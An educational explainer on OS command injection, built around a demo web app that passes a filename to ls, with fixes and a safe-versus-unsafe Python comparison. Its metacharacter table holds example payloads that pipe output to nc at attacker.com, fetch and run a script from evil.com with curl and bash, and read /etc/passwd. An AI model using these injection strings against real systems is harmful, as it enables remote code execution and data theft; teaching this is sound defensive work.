Command Injection: File Lookup Example

Command injection occurs when an application passes user-controlled input to a system shell without proper isolation. The shell interprets certain characters as control operators — separating one command from the next — so an attacker can append arbitrary commands to whatever the application intended to run.

This demo simulates a web application that lists a file under /var/www/html/uploads by passing the filename to ls. The process runs as www-data on an Ubuntu Apache server.

How Shell Metacharacters Work

MetacharacterShell MeaningInjection Example
;Run next command regardless of exit codefile.pdf; whoami
&&Run next command only if first succeedsfile.pdf && id
||Run next command only if first failsnonexistent || cat /etc/passwd
|Pipe output of first to second commandfile.pdf | nc attacker.com 4444
$(…)Command substitution — inline execution$(curl http://evil.com/shell.sh | bash)
`…`Backtick substitution (legacy form)`id`

When the application runs ls -l /var/www/html/uploads/USER_INPUT, inserting any of these characters splits the string into multiple commands the shell executes in sequence.

Real-World Impact

What an attacker can achieve

  • Run arbitrary commands as the web server user
  • Read /etc/passwd, config files, and application secrets
  • Establish a reverse shell for persistent access
  • Pivot to internal network services not exposed to the internet
  • Deploy malware or ransomware on the server

Correct fix

  • Prefer language-native APIs over shell invocation (e.g., Python os.listdir())
  • If a shell must be used, pass arguments as an array with shell=False
  • Allowlist expected input shapes (e.g., alphanumeric + dot + hyphen only)
  • Run the web process under a least-privilege user account

Teaching Point

Command injection follows the same root cause as SQL injection: untrusted input crosses the boundary from data into instructions. The interpreter here is the OS shell rather than a SQL engine, but the fix is the same — keep data and commands structurally separate.

Unsafe

os.system("ls -l /uploads/" + filename)

Safe

subprocess.run(["ls", "-l", filename], shell=False)
